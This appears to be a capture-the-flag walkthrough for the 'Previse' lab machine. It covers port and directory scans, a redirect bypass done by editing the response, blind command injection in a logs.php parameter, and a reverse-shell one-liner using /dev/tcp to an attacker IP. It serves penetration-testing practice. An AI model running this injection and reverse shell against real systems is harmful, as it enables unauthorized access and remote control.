* Nmap scan to determine open ports and services used on them

```bash
Nmap 7.92 scan initiated Mon Oct 11 15:52:41 2021 as: nmap -sC -sV -Pn -p- -v -oN nmap.out 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 11 16:07:43 2021 -- 1 IP address (1 host up) scanned in 901.29 seconds
```

* Run Ferox to see the existing directories in the application

```bash
feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.11.104/ -x php -o ferox1.out

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.3.1
───────────────────────────┬──────────────────────
     Target Url            │ http://10.10.11.104/
     Threads               │ 50
     Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
     Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.3.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Output File           │ ferox1.out
     Extensions            │ [php]
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      309c http://10.10.11.104/js
302        0l        0w        0c http://10.10.11.104/logs.php
302      112l      263w     4914c http://10.10.11.104/files.php
200        0l        0w        0c http://10.10.11.104/config.php
301        9l       28w      310c http://10.10.11.104/css
302       71l      164w     2801c http://10.10.11.104/index.php
302        0l        0w        0c http://10.10.11.104/logout.php
200       53l      138w     2224c http://10.10.11.104/login.php
302        0l        0w        0c http://10.10.11.104/download.php
302       93l      238w     3994c http://10.10.11.104/accounts.php
200       31l       60w     1248c http://10.10.11.104/nav.php
200       20l       64w      980c http://10.10.11.104/header.php
200        5l       14w      217c http://10.10.11.104/footer.php
302       74l      176w     2966c http://10.10.11.104/status.php
[####################] - 59s   373686/373686  0s      found:14      errors:181950 
[####################] - 46s   124562/124562  2695/s  http://10.10.11.104/
[####################] - 44s   124562/124562  2807/s  http://10.10.11.104/js
[####################] - 44s   124562/124562  2993/s  http://10.10.11.104/css
```

* Check all the directories and you will see 2 interesting files - 
	a. http://10.10.11.104/accounts.php
	b. http://10.10.11.104/nav.php
	
* Goto accounts.php, capture request in burp, capture response. In response, you will see that you get unauthorized access to account creation page, but the response status is 302(redirection). Change it to 200 OK and change the location from login.php to accounts.php

* You get access to account creation page. Create an account and log into it.

* Search around the application and you will see a "sitebackup" file present. Click onto it to download and you have access to all the source code of application.

* SOURCE CODE REVIEW!

* You will see a parameter called delim being used in the logs.php. It uses the post method directly without input sanitization with the exec(). Try injecting commands using 
	* &
	* && 
	* | 
	* || 
	* ; 
	* ;;

* Here & worked. But the injection is blind, so as to confirm injection is present use tcpdump -i tun0 icmp into the terminal and on the burp suite add the ping command to delim as - 
	delim = comma & ping -c1 \<your-ip>. You will see a response on tcp dump confirming the injection.
	
* Upload a reverse shell in this param. Currently used -  bash -c "bash -i >& /dev/tcp/10.10.16.10/1000 0>&1"
	
* listen to this port using rlwrap or nc -nvlp \<port-no.>. You will get a shell.	